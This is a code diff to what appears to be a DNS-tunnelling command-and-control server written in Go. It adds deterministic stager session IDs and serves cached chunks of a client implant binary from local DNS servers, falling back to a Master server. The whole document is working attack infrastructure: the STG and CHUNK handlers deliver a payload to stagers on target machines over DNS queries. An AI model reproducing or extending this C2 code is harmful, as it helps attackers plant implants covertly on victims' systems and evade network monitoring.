@@ -5,13 +5,24 @@ package main
 
 import (
 	"bytes"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
+
+// generateDeterministicSessionID creates a consistent session ID from stagerIP + clientBinaryID
+// This ensures all DNS servers generate the same session ID for the same stager
+func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
+	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
+	hash := sha256.Sum256([]byte(data))
+	hashHex := hex.EncodeToString(hash[:])
+	return fmt.Sprintf("stg_%s", hashHex[:4])
+}
 
 // Constants are now defined in constants.go
 
@@ -2132,7 +2143,6 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 
 	case "STG":
 		// STG|IP|OS|ARCH|timestamp - Stager initialization request
-		// Stager is requesting the client binary
 		if len(msgParts) < 4 {
 			return "", false
 		}
@@ -2142,7 +2152,39 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 
 		logf("[Stager] Init request from %s (os=%s, arch=%s)", stagerIP, osType, arch)
 
-		// Forward to Master to get session info and total chunks
+		// Check local cache first - if we have chunks cached, use them
+		clientBinaryID, totalChunks, hasCached := c2.db.GetCachedBinaryInfo()
+		if hasCached && totalChunks > 0 {
+			// Generate deterministic session ID from stagerIP + clientBinaryID
+			// This ensures all DNS servers use the same session ID for the same stager
+			sessionID := generateDeterministicSessionID(stagerIP, clientBinaryID)
+
+			// Store session locally
+			c2.mutex.Lock()
+			c2.stagerSessions[stagerIP] = &StagerSession{
+				ClientIP:       stagerIP,
+				SessionID:      sessionID,
+				ClientBinaryID: clientBinaryID,
+				OS:             osType,
+				Arch:           arch,
+				TotalChunks:    totalChunks,
+				DeliveredCount: 0,
+				StartedAt:      time.Now(),
+				LastActivity:   time.Now(),
+			}
+			c2.mutex.Unlock()
+
+			logf("[Stager] Using cached binary %s (%d chunks) for session %s", clientBinaryID, totalChunks, sessionID)
+
+			// Notify Master about stager contact (async, don't wait)
+			if masterClient != nil {
+				go masterClient.NotifyStagerContact(stagerIP, osType, arch, clientBinaryID, totalChunks)
+			}
+
+			return fmt.Sprintf("META|%s|%d", sessionID, totalChunks), true
+		}
+
+		// No local cache - fall back to Master
 		if masterClient != nil {
 			sessionInfo, err := masterClient.InitStagerSession(stagerIP, osType, arch)
 			if err != nil {
@@ -2164,33 +2206,10 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			}
 			c2.mutex.Unlock()
 
-			// Return META response (will be base36 encoded by main.go)
 			return fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks), true
 		}
 
-		// No Master connection - check local cache
-		c2.mutex.RLock()
-		cachedChunks, hasCached := c2.db.GetCachedStagerChunks()
-		c2.mutex.RUnlock()
-
-		if hasCached && len(cachedChunks) > 0 {
-			sessionID := fmt.Sprintf("local-%d", time.Now().UnixNano())
-			c2.mutex.Lock()
-			c2.stagerSessions[stagerIP] = &StagerSession{
-				ClientIP:     stagerIP,
-				SessionID:    sessionID,
-				OS:           osType,
-				Arch:         arch,
-				TotalChunks:  len(cachedChunks),
-				Chunks:       cachedChunks,
-				StartedAt:    time.Now(),
-				LastActivity: time.Now(),
-			}
-			c2.mutex.Unlock()
-			return fmt.Sprintf("META|%s|%d", sessionID, len(cachedChunks)), true
-		}
-
-		logf("[Stager] No Master and no cached chunks available")
+		logf("[Stager] No cached chunks and no Master connection")
 		return "", false
 
 	case "CHUNK":
@@ -2221,7 +2240,22 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		session.LastActivity = time.Now()
 		c2.mutex.Unlock()
 
-		// Get chunk from Master
+		// Try local cache first if we have a client binary ID
+		if session.ClientBinaryID != "" {
+			chunk, found := c2.db.GetCachedStagerChunk(session.ClientBinaryID, chunkIndex)
+			if found {
+				// Update progress
+				c2.mutex.Lock()
+				session.DeliveredCount = chunkIndex + 1
+				session.LastChunkDelivered = chunkIndex
+				c2.mutex.Unlock()
+
+				c2.logStagerProgress(session, chunkIndex, clientIP)
+				return fmt.Sprintf("CHUNK|%s", chunk), true
+			}
+		}
+
+		// Fall back to Master for chunk
 		if masterClient != nil {
 			chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
 			if err != nil {
@@ -2235,14 +2269,11 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			session.LastChunkDelivered = chunkIndex
 			c2.mutex.Unlock()
 
-			// Log progress
 			c2.logStagerProgress(session, chunkIndex, clientIP)
-
-			// Return chunk (CHUNK|base64_data - NOT base36 encoded, sent as plain text)
 			return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData), true
 		}
 
-		logf("[Stager] No Master connection for chunk request")
+		logf("[Stager] No cached chunk and no Master connection")
 		return "", false
 
 	default:
